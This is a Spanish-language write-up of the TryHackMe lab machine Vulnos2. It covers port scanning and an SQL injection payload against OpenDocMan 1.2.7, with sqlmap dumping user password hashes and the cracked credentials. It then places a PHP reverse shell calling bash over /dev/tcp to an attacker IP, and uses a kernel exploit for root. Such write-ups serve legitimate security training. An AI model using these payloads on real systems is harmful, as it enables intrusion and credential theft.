        <content:encoded>&lt;p&gt;Vulnos2 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Vulnos2&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Just a typical web server, nothing to be suspicious of here.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RoomCode&lt;/td&gt;
&lt;td&gt;vulnos2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3500&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/trymehack/vulnos2# masscan -p1-65535,U:1-65535 10.10.169.208 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-19 03:46:19 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.169.208                                   
Discovered open port 80/tcp on 10.10.169.208                                   

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Sep 18 23:47:13 2019 as: nmap -sV -p- --min-rate 1000 -o nmap.scan 10.10.169.208&lt;/span&gt;
Warning: 10.10.169.208 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.169.208
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65517&lt;/span&gt; closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open     http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
6667/tcp  open     irc     ngircd
10337/tcp filtered unknown
12017/tcp filtered unknown
13034/tcp filtered unknown
13725/tcp filtered unknown
15125/tcp filtered unknown
27879/tcp filtered unknown
32710/tcp filtered unknown
33826/tcp filtered unknown
36395/tcp filtered unknown
36503/tcp filtered unknown
45704/tcp filtered unknown
46157/tcp filtered unknown
46605/tcp filtered unknown
49823/tcp filtered unknown
60384/tcp filtered unknown
Service Info: Host: irc.example.net&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Sep 18 23:49:32 2019 -- 1 IP address (1 host up) scanned in 139.20 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Sep 18 23:50:25 2019 as: nmap -sV -sC -p 22,80,6667 -o nmap_sv.scan 10.10.169.208&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.169.208
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.4s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: VulnOSv2
6667/tcp open  irc     ngircd
Service Info: Host: irc.example.net&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Sep 18 23:50:59 2019 -- 1 IP address (1 host up) scanned in 34.28 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;whatweb&#34;&gt;WHATWEB&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.52.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Pagina en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.54.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;dirbuster&#34;&gt;DIRBUSTER&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de direcotrios, archivos html y txt con dirbuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/trymehack/vulnos2# gobuster dir -u http://10.10.169.208/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t &lt;span class=&#34;nv&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.169.208/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions:     php,html,txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/18 23:53:44 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/09/18 23:58:34 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;http---jabc&#34;&gt;HTTP - /jabc/&lt;/h3&gt;
&lt;p&gt;Encontramos dentro de la pagina principla un enlace que nos redirige hacia otra pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2021.57.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de la pagina de Documentation a simple vista se ve que no hay contenido de esta pagina al analizar el codigo fuente de la pagina, observamos que existe texto oculto por razones de &amp;ldquo;seguridad&amp;rdquo;. En el texto nos indica que para visitar la documentacion de la pagina visitemos &lt;code&gt;/jabcd0cs/&lt;/code&gt; e iniciemos sesion con &lt;code&gt;guest/guest&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.03.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;http---jabcd0cs&#34;&gt;HTTP - /jabcd0cs/&lt;/h3&gt;
&lt;p&gt;Visitamos la pagina y nos muestra un panel para iniciar sesion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.04.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al iniciar sesion en la plataforma nos muestra un panel de control.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.11.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que la plataforma es &lt;code&gt;OpenDocMan v1.2.7&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.12.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;opendocman-127---multiple-vulnerabilities&#34;&gt;OpenDocMan 1.2.7 - Multiple Vulnerabilities&lt;/h4&gt;
&lt;p&gt;Al investgar un poco mas acerca de esta plataforma encontramos que en especifico esta version de OpenDocMan tiene dos vulnerabilidades. La primera es una vulnerabilidad de Inyeccion de SQL y la segunda Improper Access Control.&lt;/p&gt;
&lt;h4 id=&#34;sql-injection---opendocman-127&#34;&gt;SQL Injection - OpenDocMan 1.2.7&lt;/h4&gt;
&lt;p&gt;Comprobamos si la vulnerabilidad de SQLi esta presente en la plataforma con la url y parametros para ver el usuario (&lt;code&gt;user()&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ajax_udf.php?q=1&amp;amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.15.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que la vulnerabilidad esta presente ya que nos muestra el usuario. Para obtener los datos de la base de datos, utilizamos burpsuite para interceptar el trafico, guardamos el trafico del payload de SQLi de esta plataforma en un archivo response.req y utilizamos sqlmap con este archivo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;response.req&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.35.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;sqlmap&#34;&gt;SQLMAP&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Comando:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -r response.req --dbs
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.36.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Database: jabcd0cs
[15 tables]
+-------------------+
| odm_access_log    |
| odm_admin         |
| odm_category      |
| odm_data          |
| odm_department    |
| odm_dept_perms    |
| odm_dept_reviewer |
| odm_filetypes     |
| odm_log           |
| odm_odmsys        |
| odm_rights        |
| odm_settings      |
| odm_udf           |
| odm_user          |
| odm_user_perms    |
+-------------------+

Database: jabcd0cs
Table: odm_user
[2 entries]
+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+
| id | phone       | Email              | username | password                         | last_name | first_name | department | pw_reset_code |
+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+
| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b | min       | web        | 2          | &amp;lt;blank&amp;gt;       |
| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 | guest     | guest      | 2          | NULL          |
+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos &lt;code&gt;md5online.org&lt;/code&gt; para obtener la contraseña del hash md5 del usuario webadmin.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2022.39.56.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credenciales:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;webmin:webmin1980
guest:guest
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;shell---php&#34;&gt;SHELL - PHP &lt;/h2&gt;
&lt;p&gt;Ya que tenemos las credenciales de administrador regresamos a la pagina principal &lt;code&gt;/jabc/&lt;/code&gt; y visitamos el panel de inicio de sesion y utilizamos las credenciales (&lt;code&gt;webmin:webmin1980&lt;/code&gt;), ya que tenemos control de las paginas habilitamos el modulo de PHP (PHP Filter), luego de esto agregamos codigo php con nuestra shell inversa a la pagina de &amp;lsquo;Documentation&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP Modulo:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.45.05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Codigo PHP:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.1.72/1337 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.47.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Netcat:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Ponemos a la escucha nuestra maquina con netcat y el puerto 1337.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.49.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Verificamos la version del kernel de la maquina y verificamos si existe un exploit para esa version con searchsploit.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Version de Kernel:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.55.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Searchsploit:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-18%2023.55.53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos el exploit, lo compilamos y lo descargamos en la maquina, le damos permisos al archivo de ejecucion, ejecutamos el archivo y obtenemos permisos root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-19%2000.08.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra flag en &lt;strong&gt;/root/flag.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnos2/Screenshot%20from%202019-09-19%2000.10.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ExploitDB:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/32075&#34;&gt;&lt;strong&gt;OpenDocMan 1.2.7 - Multiple Vulnerabilities&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
